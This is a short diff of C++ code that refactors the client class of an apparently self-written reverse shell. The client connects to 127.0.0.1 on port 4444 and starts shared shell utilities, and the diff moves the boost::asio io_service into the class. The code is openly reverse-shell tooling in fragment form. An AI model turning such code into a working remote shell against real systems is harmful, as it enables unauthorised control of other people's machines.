@@ -24,18 +24,19 @@ private:
 
 public:
 
-	Client(IoService& ioService)
-		: m_socket(ioService), m_ShellUtils(this)
+	Client()
+		: m_ioService(IoService()), m_socket(m_ioService), m_ShellUtils(this)
 	{
-		Connect(ioService);
+		Connect();
 		m_ShellUtils.Start();
+		m_ioService.run();
 	}
 
 private:
 
-	void Connect(IoService& ioService)
+	void Connect()
 	{
-		TcpResolver resolver(ioService);
+		TcpResolver resolver(m_ioService);
 		auto endpointIterator = resolver.resolve({ "127.0.0.1", "4444" });
 
 		while (true)
@@ -102,6 +103,7 @@ private:
 
 
 public: // TODO - Turn this back into private after solving the CommonReverseShell template issues. 
+	IoService m_ioService;
 	boost::asio::ip::tcp::socket m_socket;
 	SharedReverseShellUtils<Client> m_ShellUtils;
 	friend class SharedReverseShellUtils<Client>;
